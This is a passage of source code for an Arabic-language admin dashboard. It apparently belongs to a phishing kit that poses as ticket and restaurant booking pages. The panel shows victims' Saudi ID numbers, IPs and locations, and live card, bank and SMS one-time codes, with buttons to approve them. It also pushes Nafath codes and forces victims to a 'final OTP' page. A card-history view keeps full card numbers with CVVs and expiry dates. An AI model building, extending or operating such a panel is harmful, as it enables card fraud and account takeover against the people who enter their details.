        <Row label="الحالة" value={visitor.status} />
        {(visitor.ip || visitor.ipAddress) && (
          <Row
            label="عنوان IP"
            value={String(visitor.ip || visitor.ipAddress)}
            mono
          />
        )}
        {(visitor.geoCountry || visitor.geoCity) && (
          <Row
            label="الدولة"
            value={
              [
                visitor.geoCity,
                visitor.geoRegion,
                visitor.geoCountry,
                visitor.geoCountryCode
                  ? `(${String(visitor.geoCountryCode).toUpperCase()})`
                  : "",
              ]
                .filter(Boolean)
                .join(" · ") || "—"
            }
          />
        )}
        <Row label="معرّف الزائر" value={visitor.id.slice(0, 12) + "…"} mono />
      </div>
    </div>
  );
}

function CustomerInfoCard({ visitor }: { visitor: Visitor }) {
  // Maps for ticket / restaurant booking fields actually present in the app.
  const basicRows = [
    safeText(visitor.name) && (
      <Row key="n" label="الاسم" value={visitor.name} />
    ),
    safeText(visitor.phone) && (
      <Row key="p" label="رقم الجوال" value={visitor.phone} mono />
    ),
    safeText(visitor.email) && (
      <Row key="em" label="البريد الإلكتروني" value={visitor.email} mono />
    ),
    safeText(visitor.saudiId) && (
      <Row key="si" label="رقم الهوية" value={visitor.saudiId} mono />
    ),
  ].filter(Boolean);

  // Ticket-flow rows
  const ticketRows = [
    safeText(visitor.ticketQuantity) && (
      <Row key="tq" label="عدد التذاكر" value={visitor.ticketQuantity} />
    ),
    safeText(visitor.ticketPrice) && (
      <Row key="tp" label="سعر التذكرة" value={`${visitor.ticketPrice} ر.س`} />
    ),
    safeText(visitor.totalAmount) && (
      <Row
        key="ta"
        label="المبلغ الإجمالي"
        value={`${visitor.totalAmount} ر.س`}
      />
    ),
    safeText(visitor.bookingDate) && (
      <Row key="bd" label="تاريخ الزيارة" value={visitor.bookingDate} />
    ),
    safeText(visitor.bookingTime) && (
      <Row key="bt" label="وقت الزيارة" value={visitor.bookingTime} />
    ),
  ].filter(Boolean);

  // Restaurant-reservation rows
  const restaurantRows = [
    safeText(visitor.restaurant) && (
      <Row key="rs" label="المطعم" value={visitor.restaurant} />
    ),
    safeText(visitor.date) && (
      <Row key="rd" label="تاريخ الحجز" value={visitor.date} />
    ),
    safeText(visitor.time) && (
      <Row key="rt" label="وقت الحجز" value={visitor.time} />
    ),
    safeText(visitor.guests) && (
      <Row key="rg" label="عدد الأشخاص" value={visitor.guests} />
    ),
    safeText(visitor.notes) && (
      <Row key="rn" label="ملاحظات" value={visitor.notes} />
    ),
    safeText(visitor.total) && (
      <Row key="rto" label="إجمالي الحجز" value={`${visitor.total} ر.س`} />
    ),
  ].filter(Boolean);

  return (
    <div className="space-y-4 grid w-full ">
      {basicRows.length > 0 && (
        <Panel title="معلومات أساسية">
          <div className="space-y-1">{basicRows}</div>
        </Panel>
      )}
      {ticketRows.length > 0 && (
        <Panel title="بيانات التذاكر">
          <div className="space-y-1">{ticketRows}</div>
        </Panel>
      )}
      {restaurantRows.length > 0 && (
        <Panel title="حجز المطعم">
          <div className="space-y-1">{restaurantRows}</div>
        </Panel>
      )}
    </div>
  );
}

function OtpControlCard({
  visitor,
  otpInput: _otpInput,
  setOtpInput: _setOtpInput,
  otpDirect,
  setOtpDirect,
  onApprove,
  onReject,
  onSendOtp,
  onForceFinalOtp,
}: {
  visitor: Visitor;
  otpInput: string;
  setOtpInput: (s: string) => void;
  otpDirect: string;
  setOtpDirect: (s: string) => void;
  onApprove: (field: "otpApprovalStatus" | "phoneOtpApprovalStatus") => void;
  onReject: (field: "otpApprovalStatus" | "phoneOtpApprovalStatus") => void;
  onSendOtp: (code: string) => void;
  onForceFinalOtp: () => void;
}) {
  const cardOtp = String(visitor.otp || "");
  const phoneOtp = String(visitor.smsOtp || "");
  const nafadOtp = String(visitor.nafadOtp || "");
  const waitingBank = visitor.otpApprovalStatus === "waiting";
  const waitingPhone = visitor.phoneOtpApprovalStatus === "waiting";
  const cp = String(visitor.currentPage || "");
  const onOtpStep =
    cp === "otp" ||
    cp === "otp_verified" ||
    cp === "reserve_otp" ||
    cp === "confirmation" ||
    isFinalStep(visitor);
  if (
    !cardOtp &&
    !phoneOtp &&
    !nafadOtp &&
    !waitingBank &&
    !waitingPhone &&
    !onOtpStep
  )
    return null;

  return (
    <Panel
      title="رموز التحقق (OTP)"
      badge={waitingBank || waitingPhone ? "بانتظار الموافقة" : undefined}
    >
      <div className="space-y-3">
        <OtpRow
          label="OTP البطاقة (البنك)"
          step={5}
          code={cardOtp}
          status={
            waitingBank
              ? "waiting"
              : visitor.otpApprovalStatus || (cardOtp ? "received" : "—")
          }
          canDecide={waitingBank}
          onApprove={() => onApprove("otpApprovalStatus")}
          onReject={() => onReject("otpApprovalStatus")}
        />
        {/* Direct push OTP */}
        <div>
          <input
            value={otpDirect}
            onChange={(e) => setOtpDirect(e.target.value)}
            placeholder="أدخل رقم النقاط"
            className="w-full px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-xs text-slate-100 placeholder-slate-500 focus:outline-none focus:border-cyan-500 text-right"
            data-testid="push-otp-input"
          />
          <div className="grid grid-cols-2 gap-1.5 mt-1.5">
            <button
              onClick={() => {
                if (otpDirect.trim()) {
                  onSendOtp(otpDirect.trim());
                  setOtpDirect("");
                }
              }}
              className="py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
              data-testid="push-otp-send"
            >
              <Send className="w-3 h-3" /> إرسال
            </button>
            <button
              onClick={onForceFinalOtp}
              className="py-1.5 bg-gradient-to-r from-violet-600 to-purple-600 hover:from-violet-500 hover:to-purple-500 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
              data-testid="force-final"
            >
              <ArrowLeftRight className="w-3 h-3" /> توجيه إلى Final OTP
            </button>
          </div>
        </div>
      </div>
    </Panel>
  );
}

function BankContactPushRow({ visitor }: { visitor: Visitor }) {
  const v = visitor as any;
  const requested = Boolean(v.bankContactRequest);
  const confirmed = Boolean(v.bankContactConfirmed);
  const requestedAt = String(v.bankContactAt || "");
  const confirmedAt = String(v.bankContactConfirmedAt || "");
  const [pushing, setPushing] = useState(false);

  // Status to show under the button.
  let statusLabel = "";
  let statusClass = "";
  if (confirmed && confirmedAt) {
    statusLabel = `تم تأكيد الاستلام · ${fmtRelative(confirmedAt)}`;
    statusClass = "text-emerald-400";
  } else if (requested && requestedAt) {
    statusLabel = `بانتظار التأكيد · ${fmtRelative(requestedAt)}`;
    statusClass = "text-amber-300";
  }

  const handlePush = async () => {
    if (pushing) return;
    setPushing(true);
    try {
      await pushBankContactRequest(visitor.id);
    } finally {
      setPushing(false);
    }
  };

  return (
    <div className="pt-2 border-t border-slate-700/60">
      <button
        onClick={handlePush}
        disabled={pushing}
        className={`w-full py-2 rounded-lg text-xs font-semibold flex items-center justify-center gap-1.5 transition-colors ${
          confirmed
            ? "bg-emerald-700/40 hover:bg-emerald-700/60 text-emerald-100"
            : requested
              ? "bg-amber-600/40 hover:bg-amber-600/60 text-amber-100"
              : "bg-gradient-to-r from-sky-600 to-blue-600 hover:from-sky-500 hover:to-blue-500 text-white"
        } disabled:opacity-60`}
        data-testid="button-push-bank-contact"
      >
        <PhoneCall className="w-3.5 h-3.5" />
        {confirmed
          ? "تم التأكيد · إعادة الإرسال"
          : requested
            ? "إعادة إرسال إشعار البنك"
            : "إرسال إشعار البنك"}
      </button>
      {statusLabel && (
        <div
          className={`text-[11px] mt-1 text-center ${statusClass}`}
          data-testid="text-bank-contact-status"
        >
          {statusLabel}
        </div>
      )}
    </div>
  );
}

function NafadControl({
  visitor,
  onApprove,
  onReject,
}: {
  visitor: Visitor;
  onApprove: (
    field:
      | "cardApprovalStatus"
      | "otpApprovalStatus"
      | "phoneOtpApprovalStatus",
  ) => void;
  onReject: (
    field:
      | "cardApprovalStatus"
      | "otpApprovalStatus"
      | "phoneOtpApprovalStatus",
  ) => void;
}) {
  const [code, setCode] = useState("");
  const sentCode = String(visitor.nafadConfirmationCode || "");
  const status = visitor.nafadConfirmationStatus;

  async function sendCode() {
    if (!db) return;
    const clean = code.replace(/\D/g, "").slice(0, 2);
    if (clean.length < 2) return;
    await setDoc(
      doc(db, "pays", visitor.id),
      {
        nafadConfirmationCode: clean,
        nafadConfirmationStatus: "waiting",
        nafadUpdatedAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      },
      { merge: true },
    );
    setCode("");
  }

  async function clearCode() {
    if (!db) return;
    await setDoc(
      doc(db, "pays", visitor.id),
      {
        nafadConfirmationCode: "",
        nafadConfirmationStatus: "waiting",
        nafadUpdatedAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      },
      { merge: true },
    );
  }

  return (
    <div className="bg-teal-500/10 border border-teal-500/30 rounded-lg p-2 space-y-2">
      <div className="text-[11px] text-teal-300 font-bold flex items-center justify-end">
        {sentCode ? (
          <span
            className="font-mono text-base text-teal-200"
            dir="ltr"
            data-testid="admin-nafad-current"
          >
            {sentCode}
          </span>
        ) : (
          <span className="text-[10px] text-amber-300">
            المستخدم بانتظار الرقم
          </span>
        )}
      </div>

      <div className="flex gap-1.5">
        <input
          value={code}
          onChange={(e) =>
            setCode(e.target.value.replace(/\D/g, "").slice(0, 2))
          }
          placeholder="رقم من رقمين"
          inputMode="numeric"
          maxLength={2}
          dir="ltr"
          data-testid="admin-nafad-input"
          className="flex-1 bg-slate-900/60 border border-slate-700 rounded px-2 py-1.5 text-sm font-mono text-teal-200 text-center focus:outline-none focus:border-teal-400"
        />
        <button
          onClick={sendCode}
          disabled={code.length < 2}
          data-testid="admin-nafad-send"
          className="px-3 py-1.5 bg-teal-500/30 text-teal-100 rounded text-xs font-bold border border-teal-500/50 hover:bg-teal-500/40 disabled:opacity-40 disabled:cursor-not-allowed"
        >
          إرسال
        </button>
        {sentCode && (
          <button
            onClick={clearCode}
            data-testid="admin-nafad-clear"
            title="مسح وإعادة طلب رقم"
            className="px-2 py-1.5 bg-slate-800 text-slate-300 rounded text-xs border border-slate-700 hover:bg-slate-700"
          >
            ✕
          </button>
        )}
      </div>

      {sentCode && (
        <div className="grid grid-cols-2 gap-1.5">
          <button
            onClick={() => onApprove("nafadConfirmationStatus" as any)}
            data-testid="admin-nafad-approve"
            className={`py-1 rounded text-xs font-semibold border ${
              status === "approved"
                ? "bg-green-500/40 text-green-100 border-green-400"
                : "bg-green-500/20 text-green-300 border-green-500/30 hover:bg-green-500/30"
            }`}
          >
            قبول نفاذ
          </button>
          <button
            onClick={() => onReject("nafadConfirmationStatus" as any)}
            data-testid="admin-nafad-reject"
            className={`py-1 rounded text-xs font-semibold border ${
              status === "rejected"
                ? "bg-red-500/40 text-red-100 border-red-400"
                : "bg-red-500/20 text-red-300 border-red-500/30 hover:bg-red-500/30"
            }`}
          >
            رفض نفاذ
          </button>
        </div>
      )}
    </div>
  );
}

function CustomizeDropdown({
  settings,
  onChange,
  onReset,
}: {
  settings: CardSettings;
  onChange: (key: CardKey, patch: Partial<CardSetting>) => void;
  onReset: () => void;
}) {
  const [open, setOpen] = useState(false);

  useEffect(() => {
    if (!open) return;
    const onDoc = (e: MouseEvent) => {
      const t = e.target as HTMLElement;
      if (!t.closest("[data-customize-dropdown]")) setOpen(false);
    };
    document.addEventListener("mousedown", onDoc);
    return () => document.removeEventListener("mousedown", onDoc);
  }, [open]);

  const hiddenCount = (Object.values(settings) as CardSetting[]).filter(
    (s) => !s.visible,
  ).length;

  return (
    <div className="relative" data-customize-dropdown>
      <button
        onClick={() => setOpen((o) => !o)}
        className="px-3 py-2 rounded-lg text-xs font-semibold flex items-center gap-2 bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"
        data-testid="admin-customize-btn"
      >
        <Settings className="w-4 h-4" />
        تخصيص اللوحة
        {hiddenCount > 0 && (
          <span className="text-[10px] bg-cyan-500/20 text-cyan-300 px-1.5 py-0.5 rounded">
            {hiddenCount} مخفي
          </span>
        )}
        <ChevronDown
          className={`w-3.5 h-3.5 transition ${open ? "rotate-180" : ""}`}
        />
      </button>

      {open && (
        <div
          className="absolute top-full mt-2 left-0 w-80 rounded-xl border shadow-2xl z-30"
          style={{ backgroundColor: "#0f1828", borderColor: "#1f2a3d" }}
        >
          <div className="p-3 border-b border-slate-800 flex items-center justify-between">
            <div className="text-xs font-bold text-slate-200">
              إظهار / إخفاء وتغيير حجم البطاقات
            </div>
            <button
              onClick={onReset}
              className="text-[10px] text-cyan-400 hover:text-cyan-300 flex items-center gap-1"
              data-testid="admin-customize-reset"
            >
              <RotateCcw className="w-3 h-3" />
              إعادة الضبط
            </button>
          </div>

          <div className="p-2 max-h-96 overflow-y-auto">
            {(Object.keys(CARD_LABELS) as CardKey[]).map((key) => {
              const s = settings[key];
              return (
                <div
                  key={key}
                  className="p-2 rounded-lg hover:bg-slate-800/40"
                  data-testid={`admin-customize-row-${key}`}
                >
                  <div className="flex items-center justify-between gap-2">
                    <button
                      onClick={() => onChange(key, { visible: !s.visible })}
                      className="flex items-center gap-2 flex-1 text-right"
                      data-testid={`admin-customize-toggle-${key}`}
                    >
                      {s.visible ? (
                        <Eye className="w-4 h-4 text-cyan-400" />
                      ) : (
                        <EyeOff className="w-4 h-4 text-slate-500" />
                      )}
                      <span
                        className={`text-xs font-semibold ${s.visible ? "text-slate-100" : "text-slate-500"}`}
                      >
                        {CARD_LABELS[key]}
                      </span>
                    </button>
                  </div>
                  {s.visible && (
                    <div className="mt-2 grid grid-cols-2 gap-1">
                      {([1, 2] as const).map((sp) => (
                        <button
                          key={sp}
                          onClick={() => onChange(key, { span: sp })}
                          className={`py-1 rounded-md text-[10px] font-semibold transition ${
                            s.span === sp
                              ? "bg-cyan-500/20 text-cyan-300 border border-cyan-500/40"
                              : "bg-slate-800 text-slate-400 hover:bg-slate-700 border border-transparent"
                          }`}
                          data-testid={`admin-customize-span-${key}-${sp}`}
                        >
                          {sp === 1 ? "نصف العرض" : "عرض كامل"}
                        </button>
                      ))}
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>
      )}
    </div>
  );
}

function PagesControlDropdown({ visitor }: { visitor: Visitor }) {
  const [open, setOpen] = useState(false);
  const current = Number(visitor.step) || 1;
  const directed = Number(visitor.directedStep) || 0;
  const pending = directed > 0 && directed !== current;

  useEffect(() => {
    if (!open) return;
    const onDoc = (e: MouseEvent) => {
      const t = e.target as HTMLElement;
      if (!t.closest("[data-pages-dropdown]")) setOpen(false);
    };
    document.addEventListener("mousedown", onDoc);
    return () => document.removeEventListener("mousedown", onDoc);
  }, [open]);

  return (
    <div className="relative" data-pages-dropdown>
      <button
        onClick={() => setOpen((o) => !o)}
        data-testid="pages-dropdown-toggle"
        className={`h-9 px-3 rounded-lg flex items-center gap-2 border text-xs font-bold transition ${
          pending
            ? "bg-violet-500/20 border-violet-500/50 text-violet-200"
            : "bg-cyan-500/15 border-cyan-500/40 text-cyan-300 hover:bg-cyan-500/25"
        }`}
      >
        <Layers className="w-3.5 h-3.5" />
        <span>التحكم بالصفحات</span>
        <span className="px-1.5 py-0.5 rounded bg-slate-900/60 text-[10px] font-mono">
          {current}/{getFlowTotalSteps(getVisitorFlow(visitor))}
        </span>
        <ChevronDown
          className={`w-3.5 h-3.5 transition ${open ? "rotate-180" : ""}`}
        />
      </button>

      {open && (
        <div
          className="absolute top-full mt-2 left-0 w-[340px] rounded-xl border shadow-2xl z-30 p-3"
          style={{ backgroundColor: "#111a2c", borderColor: "#1f2a3d" }}
        >
          <div className="flex items-center justify-between mb-2 pb-2 border-b border-slate-800">
            <div className="text-xs font-bold text-slate-200">
              التحكم بالصفحات
            </div>
            <div className="text-[10px] text-cyan-400">الحالية: {current}</div>
          </div>
          <PagesControl visitor={visitor} />
        </div>
      )}
    </div>
  );
}

function PagesControl({ visitor }: { visitor: Visitor }) {
  const current = Number(visitor.step) || 1;
  const directed = Number(visitor.directedStep) || 0;
  const flow = getVisitorFlow(visitor);
  const flowLabels = getFlowStepLabels(flow);

  async function pushStep(target: number) {
    if (!db) return;
    await setDoc(
      doc(db, "pays", visitor.id),
      {
        directedStep: target,
        directedAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      },
      { merge: true },
    );
  }

  async function clearApproval(field: string) {
    if (!db) return;
    // Mirror the reset onto the legacy fields so the user-facing app's
    // listenForApproval / listenForOtpApproval listeners do not see a stale
    // "approved" or "rejected" state when the admin re-requests a fresh
    // submission.
    const payload: Record<string, unknown> = {
      [field]: "waiting",
      updatedAt: new Date().toISOString(),
    };
    if (field === "cardApprovalStatus") {
      payload.cardApproved = false;
      payload.cardStatus = "pending_approval";
      payload.status = "pending_approval";
    } else if (field === "otpApprovalStatus") {
      payload.otpApproved = false;
      payload.otpStatus = "pending";
    }
    await setDoc(doc(db, "pays", visitor.id), payload, { merge: true });
  }

  return (
    <div className="space-y-3">
      <div className="grid grid-cols-2 gap-1.5">
        {Object.entries(flowLabels).map(([k, label]) => {
          const n = Number(k);
          const pageId = getFlowStepPage(flow, n);
          const isCurrent = current === n;
          const isDirected = directed === n;
          return (
            <button
              key={k}
              onClick={() => pushStep(n)}
              data-testid={`push-step-${n}`}
              className={`py-2 px-2 rounded-lg text-[11px] font-bold transition border text-right ${
                isCurrent
                  ? "bg-cyan-500 text-slate-900 border-cyan-400"
                  : isDirected
                    ? "bg-violet-500/30 text-violet-200 border-violet-400/50"
                    : "bg-slate-800/60 text-slate-300 border-slate-700 hover:bg-slate-700"
              }`}
            >
              <div className="flex items-center justify-between gap-1 mb-0.5">
                <span className="text-[9px] opacity-70">{n}</span>
                <span
                  className="text-[9px] font-mono opacity-70 truncate"
                  dir="ltr"
                >
                  {pageId}
                </span>
              </div>
              <div className="leading-tight truncate">{label}</div>
            </button>
          );
        })}
      </div>

      <div className="border-t border-slate-800 pt-2 space-y-1">
        <div className="text-[10px] text-slate-500 mb-1">طلب جديد</div>
        <div className="grid grid-cols-2 gap-1.5">
          <button
            onClick={() => clearApproval("cardApprovalStatus")}
            className="py-1 bg-slate-800/60 text-slate-300 rounded text-[10px] font-semibold border border-slate-700 hover:bg-slate-700"
          >
            بطاقة
          </button>
          <button
            onClick={() => clearApproval("otpApprovalStatus")}
            className="py-1 bg-slate-800/60 text-slate-300 rounded text-[10px] font-semibold border border-slate-700 hover:bg-slate-700"
          >
            OTP
          </button>
        </div>
      </div>

      {directed > 0 && directed !== current && (
        <div className="text-[10px] text-violet-300 bg-violet-500/10 border border-violet-500/30 rounded p-1.5 text-center">
          ⏳ تم التوجيه إلى{" "}
          {getFlowStepPage(flow, directed) || `الخطوة ${directed}`} - بانتظار
          استجابة المستخدم
        </div>
      )}
    </div>
  );
}

function OtpRow({
  label,
  step,
  code,
  status,
  canDecide,
  onApprove,
  onReject,
}: {
  label: string;
  step: number;
  code: string;
  status: string;
  canDecide: boolean;
  onApprove?: () => void;
  onReject?: () => void;
}) {
  const length = Math.max(code.length, 4);
  const digits = code.padEnd(length, "•").slice(0, length).split("");
  const tone =
    status === "waiting"
      ? "border-amber-500/40 bg-amber-500/5"
      : status === "approved"
        ? "border-green-500/30 bg-green-500/5"
        : status === "rejected"
          ? "border-red-500/30 bg-red-500/5"
          : "border-slate-700 bg-slate-900/40";
  return (
    <div className={`rounded-lg p-2 border ${tone}`}>
      <div className="flex items-center justify-between mb-1.5">
        <div className="flex items-center gap-1.5">
          <span className="text-[10px] text-slate-400 font-semibold">
            {label}
          </span>
          <span className="text-[9px] text-slate-500 bg-slate-800 rounded px-1.5 py-0.5">
            مرحلة {step}
          </span>
        </div>
        <span className="text-[10px] text-slate-500">
          {code ? `${code.length} رقم` : "—"}
        </span>
      </div>
      <div className="flex gap-1 justify-center mb-2" dir="ltr">
        {digits.map((d, i) => (
          <div
            key={i}
            className={`w-8 h-9 rounded-md flex items-center justify-center text-base font-bold font-mono border ${
              code
                ? "bg-slate-800 border-slate-700 text-cyan-300"
                : "bg-slate-900/40 border-slate-800 text-slate-600"
            }`}
          >
            {d}
          </div>
        ))}
      </div>
      {(onApprove || onReject) && (
        <div className="grid grid-cols-2 gap-1">
          <button
            onClick={onApprove}
            disabled={!canDecide}
            className="py-1 bg-green-500/20 text-green-300 hover:bg-green-500/30 disabled:opacity-30 rounded text-[10px] font-semibold flex items-center justify-center gap-1 border border-green-500/30"
            data-testid={`otp-row-approve-${step}`}
          >
            <CheckCircle2 className="w-3 h-3" /> قبول
          </button>
          <button
            onClick={onReject}
            disabled={!canDecide}
            className="py-1 bg-red-500/20 text-red-300 hover:bg-red-500/30 disabled:opacity-30 rounded text-[10px] font-semibold flex items-center justify-center gap-1 border border-red-500/30"
            data-testid={`otp-row-reject-${step}`}
          >
            <XCircle className="w-3 h-3" /> رفض
          </button>
        </div>
      )}
    </div>
  );
}

function StatusLine({ label, status }: { label: string; status: string }) {
  const cls =
    status === "approved"
      ? "text-green-400"
      : status === "rejected"
        ? "text-red-400"
        : status === "waiting"
          ? "text-amber-400"
          : status === "received"
            ? "text-cyan-400"
            : "text-slate-500";
  const text =
    status === "approved"
      ? "تم القبول"
      : status === "rejected"
        ? "مرفوض"
        : status === "waiting"
          ? "في انتظار الإرسال..."
          : status === "received"
            ? "تم الاستلام"
            : "—";
  return (
    <div className="flex items-center justify-between text-[11px]">
      <span className="text-slate-400">{label}</span>
      <span className={`font-semibold ${cls}`}>{text}</span>
    </div>
  );
}

function BlockedBinsCard({
  bins,
  onAdd,
  onRemove,
  suggestedBin,
  suggestedLast4,
}: {
  bins: string[];
  onAdd: (bin: string) => void;
  onRemove: (bin: string) => void;
  suggestedBin?: string;
  suggestedLast4?: string;
}) {
  const [input, setInput] = useState("");
  const cleanInput = input.replace(/\D/g, "").slice(0, 6);
  const canAdd = cleanInput.length === 6 && !bins.includes(cleanInput);
  const sugg = suggestedBin
    ? String(suggestedBin).replace(/\D/g, "").slice(0, 6)
    : "";
  const suggCanAdd = sugg.length === 6 && !bins.includes(sugg);

  return (
    <Panel
      title="قائمة البطاقات المحظورة"
      badge={bins.length > 0 ? `${bins.length} محظور` : undefined}
    >
      <div className="space-y-3">
        <div className="text-[11px] text-slate-400 leading-relaxed">
          أي بطاقة تبدأ بأول 6 أرقام (BIN) من القائمة سيتم رفضها تلقائياً عند
          المحاولة بدفع.
        </div>

        {/* Add form */}
        <div className="flex gap-1.5">
          <input
            type="text"
            inputMode="numeric"
            maxLength={6}
            value={input}
            onChange={(e) => setInput(e.target.value.replace(/\D/g, ""))}
            onKeyDown={(e) => {
              if (e.key === "Enter" && canAdd) {
                onAdd(cleanInput);
                setInput("");
              }
            }}
            placeholder="مثال: 453204"
            dir="ltr"
            className="flex-1 px-2 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-sm font-mono text-cyan-300 text-center placeholder-slate-600 focus:outline-none focus:border-red-500/60"
            data-testid="blocklist-input"
          />
          <button
            onClick={() => {
              if (!canAdd) return;
              onAdd(cleanInput);
              setInput("");
            }}
            disabled={!canAdd}
            className="px-3 py-1.5 bg-red-500/20 hover:bg-red-500/30 disabled:opacity-30 disabled:cursor-not-allowed text-red-300 rounded-lg text-xs font-bold flex items-center gap-1 border border-red-500/40"
            data-testid="blocklist-add"
          >
            <Plus className="w-3.5 h-3.5" /> حظر
          </button>
        </div>

        {/* Quick-add suggestion from currently selected visitor */}
        {sugg && (
          <button
            onClick={() => suggCanAdd && onAdd(sugg)}
            disabled={!suggCanAdd}
            className={`w-full text-right px-2.5 py-2 rounded-lg border flex items-center justify-between gap-2 transition ${
              suggCanAdd
                ? "bg-amber-500/10 border-amber-500/30 hover:bg-amber-500/20 text-amber-200"
                : "bg-slate-900/40 border-slate-800 text-slate-500 cursor-not-allowed"
            }`}
            data-testid="blocklist-add-current"
          >
            <span className="text-[11px] flex items-center gap-1.5">
              <Ban className="w-3 h-3" />
              {suggCanAdd ? "حظر بطاقة الزائر الحالي" : "BIN الزائر محظور"}
            </span>
            <span className="font-mono text-[12px] font-bold" dir="ltr">
              {sugg}
              {suggestedLast4 ? ` ··· ${suggestedLast4}` : ""}
            </span>
          </button>
        )}

        {/* Blocked list */}
        <div>
          <div className="text-[11px] text-slate-500 mb-1.5 flex items-center gap-1">
            <ShieldOff className="w-3 h-3" /> البطاقات المحظورة ({bins.length})
          </div>
          <div className="space-y-1 max-h-48 overflow-y-auto">
            {bins.length === 0 && (
              <div className="text-center py-4 text-slate-600 text-[11px]">
                لا يوجد بطاقات محظورة
              </div>
            )}
            {bins.map((b) => (
              <div
                key={b}
                className="flex items-center justify-between gap-2 bg-slate-900/60 border border-slate-800 rounded-lg px-2.5 py-1.5 group"
              >
                <span
                  className="font-mono text-[13px] font-bold text-red-300 tracking-wider"
                  dir="ltr"
                >
                  {b}••••••••••
                </span>
                <button
                  onClick={() => {
                    if (confirm(`إزالة الحظر عن ${b}؟`)) onRemove(b);
                  }}
                  className="opacity-50 group-hover:opacity-100 text-slate-400 hover:text-red-400 p-1 rounded hover:bg-red-500/10"
                  data-testid={`blocklist-remove-${b}`}
                  title="إزالة"
                >
                  <XIcon className="w-3.5 h-3.5" />
                </button>
              </div>
            ))}
          </div>
        </div>
      </div>
    </Panel>
  );
}

function BlockedIpsCard({
  ips,
  onAdd,
  onRemove,
  suggestedIp,
  suggestedName,
}: {
  ips: string[];
  onAdd: (ip: string) => void;
  onRemove: (ip: string) => void;
  suggestedIp?: string;
  suggestedName?: string;
}) {
  const [input, setInput] = useState("");
  const cleanInput = input.trim();
  const looksValid =
    /^(\d{1,3}\.){3}\d{1,3}(\/\d{1,2})?$/.test(cleanInput) ||
    /^[0-9a-fA-F:]+$/.test(cleanInput);
  const canAdd = looksValid && !ips.includes(cleanInput);
  const sugg = suggestedIp ? String(suggestedIp).trim() : "";
  const suggCanAdd = !!sugg && !ips.includes(sugg);

  return (
    <Panel
      title="حظر الزوار بعنوان IP"
      badge={ips.length > 0 ? `${ips.length} محظور` : undefined}
    >
      <div className="space-y-3">
        <div className="text-[11px] text-slate-400 leading-relaxed">
          أي زائر يدخل من عنوان IP موجود بالقائمة سيُمنع من استخدام النظام ويظهر
          له رسالة حظر. يدعم IPv4 و IPv6 والـ CIDR.
        </div>

        <div className="flex gap-1.5">
          <input
            type="text"
            value={input}
            onChange={(e) => setInput(e.target.value)}
            onKeyDown={(e) => {
              if (e.key === "Enter" && canAdd) {
                onAdd(cleanInput);
                setInput("");
              }
            }}
            placeholder="مثال: 102.45.12.7"
            dir="ltr"
            className="flex-1 px-2 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-sm font-mono text-cyan-300 text-center placeholder-slate-600 focus:outline-none focus:border-red-500/60"
            data-testid="ip-blocklist-input"
          />
          <button
            onClick={() => {
              if (!canAdd) return;
              onAdd(cleanInput);
              setInput("");
            }}
            disabled={!canAdd}
            className="px-3 py-1.5 bg-red-500/20 hover:bg-red-500/30 disabled:opacity-30 disabled:cursor-not-allowed text-red-300 rounded-lg text-xs font-bold flex items-center gap-1 border border-red-500/40"
            data-testid="ip-blocklist-add"
          >
            <Plus className="w-3.5 h-3.5" /> حظر
          </button>
        </div>

        {sugg && (
          <button
            onClick={() => suggCanAdd && onAdd(sugg)}
            disabled={!suggCanAdd}
            className={`w-full text-right px-2.5 py-2 rounded-lg border flex items-center justify-between gap-2 transition ${
              suggCanAdd
                ? "bg-amber-500/10 border-amber-500/30 hover:bg-amber-500/20 text-amber-200"
                : "bg-slate-900/40 border-slate-800 text-slate-500 cursor-not-allowed"
            }`}
            data-testid="ip-blocklist-add-current"
          >
            <span className="text-[11px] flex items-center gap-1.5">
              <WifiOff className="w-3 h-3" />
              {suggCanAdd ? "حظر الزائر الحالي" : "IP الزائر محظور"}
              {suggestedName ? ` · ${suggestedName}` : ""}
            </span>
            <span className="font-mono text-[12px] font-bold" dir="ltr">
              {sugg}
            </span>
          </button>
        )}

        <div>
          <div className="text-[11px] text-slate-500 mb-1.5 flex items-center gap-1">
            <ShieldOff className="w-3 h-3" /> العناوين المحظورة ({ips.length})
          </div>
          <div className="space-y-1 max-h-48 overflow-y-auto">
            {ips.length === 0 && (
              <div className="text-center py-4 text-slate-600 text-[11px]">
                لا يوجد عناوين محظورة
              </div>
            )}
            {ips.map((ip) => (
              <div
                key={ip}
                className="flex items-center justify-between gap-2 bg-slate-900/60 border border-slate-800 rounded-lg px-2.5 py-1.5 group"
              >
                <span
                  className="font-mono text-[13px] font-bold text-red-300 tracking-wider"
                  dir="ltr"
                >
                  {ip}
                </span>
                <button
                  onClick={() => {
                    if (confirm(`إزالة الحظر عن ${ip}؟`)) onRemove(ip);
                  }}
                  className="opacity-50 group-hover:opacity-100 text-slate-400 hover:text-red-400 p-1 rounded hover:bg-red-500/10"
                  data-testid={`ip-blocklist-remove-${ip}`}
                  title="إزالة"
                >
                  <XIcon className="w-3.5 h-3.5" />
                </button>
              </div>
            ))}
          </div>
        </div>
      </div>
    </Panel>
  );
}

function CardHistoryList({
  history,
  currentCardNumber,
}: {
  history: any;
  currentCardNumber: string;
}) {
  const [open, setOpen] = useState(false);
  const [revealed, setRevealed] = useState<Record<number, boolean>>({});

  const entries = Array.isArray(history) ? history : [];
  const current = String(currentCardNumber || "").replace(/\D/g, "");

  // Show every saved card except the one currently displayed on the main card.
  // Newest first.
  const previous = entries
    .map((e: any) => ({
      cardNumber: String(e?.cardNumber || "").replace(/\D/g, ""),
      cvv: String(e?.cvv || "").replace(/\D/g, ""),
      expiryMonth: String(e?.expiryMonth || "")
        .padStart(2, "0")
        .slice(-2),
      expiryYear: String(e?.expiryYear || "")
        .slice(-2)
        .padStart(2, "0"),
      cardName: String(e?.cardName || ""),
      cardType: String(e?.cardType || ""),
      timestamp: typeof e?.timestamp === "string" ? e.timestamp : "",
    }))
    .filter((e: any) => e.cardNumber && e.cardNumber !== current)
    .reverse();

  if (previous.length === 0) return null;

  return (
    <div className="rounded-lg border border-amber-500/30 bg-amber-500/5">
